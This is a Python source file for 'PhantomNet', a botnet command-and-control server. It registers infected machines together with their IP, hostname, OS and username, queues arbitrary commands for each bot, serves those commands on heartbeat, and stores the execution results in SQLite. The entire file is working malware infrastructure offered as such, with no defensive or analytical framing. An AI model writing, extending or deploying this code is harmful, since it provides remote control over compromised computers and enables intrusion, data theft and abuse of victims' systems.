#!/usr/bin/env python3
"""
PhantomNet C2 Server - Simplified Version
Command and control server with basic functionality
"""

import asyncio
import aiohttp
import sqlite3
import json
import base64
import hashlib
import secrets
import time
import random
import string
import ssl
import logging
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phantom.log'),
        logging.StreamHandler()
    ]
)

class Bot:
    def __init__(self, bot_id: str, ip: str, hostname: str, os: str, username: str):
        self.id = bot_id
        self.ip = ip
        self.hostname = hostname
        self.os = os
        self.username = username
        self.last_seen = datetime.now()
        self.status = 'active'
        self.session_token = secrets.token_urlsafe(32)
        self.encryption_key = secrets.token_urlsafe(32)

class Command:
    def __init__(self, command_id: str, bot_id: str, command: str, args: List[str] = None):
        self.id = command_id
        self.bot_id = bot_id
        self.command = command
        self.args = args or []
        self.timestamp = datetime.now()
        self.status = 'pending'
        self.result = None

class PhantomC2Server:
    def __init__(self, host='0.0.0.0', port=8443):
        self.host = host
        self.port = port
        self.bots: Dict[str, Bot] = {}
        self.commands: Dict[str, Command] = {}
        self.session_tokens = {}
        
        # Initialize database
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT,
                hostname TEXT,
                os TEXT,
                username TEXT,
                last_seen TIMESTAMP,
                status TEXT,
                session_token TEXT,
                encryption_key TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY,
                bot_id TEXT,
                command TEXT,
                args TEXT,
                timestamp TIMESTAMP,
                status TEXT,
                result TEXT,
                FOREIGN KEY (bot_id) REFERENCES bots (id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_bot_to_db(self, bot: Bot):
        """Save bot to database"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots 
            (id, ip, hostname, os, username, last_seen, status, session_token, encryption_key)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            bot.id, bot.ip, bot.hostname, bot.os, bot.username, 
            bot.last_seen, bot.status, bot.session_token, bot.encryption_key
        ))
        conn.commit()
        conn.close()
    
    def verify_session_token(self, token: str) -> Optional[str]:
        """Verify session token and return bot_id if valid"""
        for bot_id, bot in self.bots.items():
            if bot.session_token == token:
                return bot_id
        return None
    
    def get_pending_commands(self, bot_id: str) -> List[Command]:
        """Get pending commands for bot"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT id, command, args FROM commands WHERE bot_id = ? AND status = "pending"',
            (bot_id,)
        )
        
        commands = []
        for row in cursor.fetchall():
            cmd = Command(
                command_id=row[0],
                bot_id=bot_id,
                command=row[1],
                args=json.loads(row[2]) if row[2] else []
            )
            commands.append(cmd)
        
        conn.close()
        return commands
    
    def update_command_result(self, command_id: str, result: str, status: str):
        """Update command result in database"""
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute(
            'UPDATE commands SET result = ?, status = ? WHERE id = ?',
            (result, status, command_id)
        )
        conn.commit()
        conn.close()
    
    def add_command(self, bot_id: str, command: str, args: List[str] = None) -> str:
        """Add new command to bot"""
        if args is None:
            args = []
        
        command_id = secrets.token_urlsafe(16)
        cmd = Command(command_id, bot_id, command, args)
        
        # Save to database
        conn = sqlite3.connect('phantom.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, bot_id, command, args, timestamp, status, result)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            command_id, bot_id, command, json.dumps(args), 
            cmd.timestamp, cmd.status, cmd.result
        ))
        conn.commit()
        conn.close()
        
        self.commands[command_id] = cmd
        return command_id

    async def handle_bot_register(self, request):
        """Handle bot registration"""
        try:
            data = await request.json()
            
            bot_id = data.get('bot_id', f"PHANTOM_{secrets.token_urlsafe(8).upper()}")
            bot_info = data.get('bot_info', {})
            
            # Create new bot instance
            bot = Bot(
                bot_id=bot_id,
                ip=request.remote,
                hostname=bot_info.get('hostname', 'Unknown'),
                os=bot_info.get('os', 'Unknown'),
                username=bot_info.get('username', 'Unknown')
            )
            
            # Save to database
            self.save_bot_to_db(bot)
            self.bots[bot_id] = bot
            
            # Return session token and encryption key
            response_data = {
                'session_token': bot.session_token,
                'encryption_key': bot.encryption_key,
                'status': 'registered'
            }
            
            logging.info(f"Bot registered: {bot_id} from {request.remote}")
            return aiohttp.web.json_response(response_data)
            
        except Exception as e:
            logging.error(f"Bot registration error: {e}")
            return aiohttp.web.Response(status=500)

    async def handle_bot_heartbeat(self, request):
        """Handle bot heartbeat with command retrieval"""
        try:
            data = await request.json()
            session_token = data.get('session_token')
            
            bot_id = self.verify_session_token(session_token)
            if not bot_id:
                return aiohttp.web.Response(status=401)
            
            # Update bot status
            if bot_id in self.bots:
                self.bots[bot_id].last_seen = datetime.now()
                self.bots[bot_id].status = 'active'
            
            # Get pending commands
            commands = self.get_pending_commands(bot_id)
            
            # Format commands for response
            command_list = []
            for cmd in commands:
                command_list.append({
                    'id': cmd.id,
                    'command': cmd.command,
                    'args': cmd.args
                })
            
            response_data = {
                'commands': command_list,
                'status': 'active'
            }
            
            return aiohttp.web.json_response(response_data)
            
        except Exception as e:
            logging.error(f"Heartbeat error: {e}")
            return aiohttp.web.Response(status=500)

    async def handle_command_result(self, request):
        """Handle command execution results"""
        try:
            data = await request.json()
            session_token = data.get('session_token')
            
            bot_id = self.verify_session_token(session_token)
            if not bot_id:
                return aiohttp.web.Response(status=401)
            
            command_id = data.get('command_id')
            result = data.get('result', '')
            status = data.get('status', 'completed')
            
            # Update command in database
            self.update_command_result(command_id, result, status)
            
            logging.info(f"Command result received: {command_id} from {bot_id}")
            return aiohttp.web.json_response({'status': 'received'})
            
        except Exception as e:
            logging.error(f"Command result error: {e}")
            return aiohttp.web.Response(status=500)

    async def start_server(self):
        """Start the C2 server"""
        app = aiohttp.web.Application()
        
        # Add routes
        app.router.add_post('/register', self.handle_bot_register)
        app.router.add_post('/heartbeat', self.handle_bot_heartbeat)
        app.router.add_post('/result', self.handle_command_result)
        
        runner = aiohttp.web.AppRunner(app)
        await runner.setup()
        
        site = aiohttp.web.TCPSite(runner, self.host, self.port)
        
        logging.info(f"PhantomNet C2 Server starting on {self.host}:{self.port}")
        await site.start()
        
        # Keep server running
        while True:
            await asyncio.sleep(1)

async def main():
    """Main entry point"""
    server = PhantomC2Server(host='0.0.0.0', port=8443)
    await server.start_server()

if __name__ == '__main__':
    asyncio.run(main())
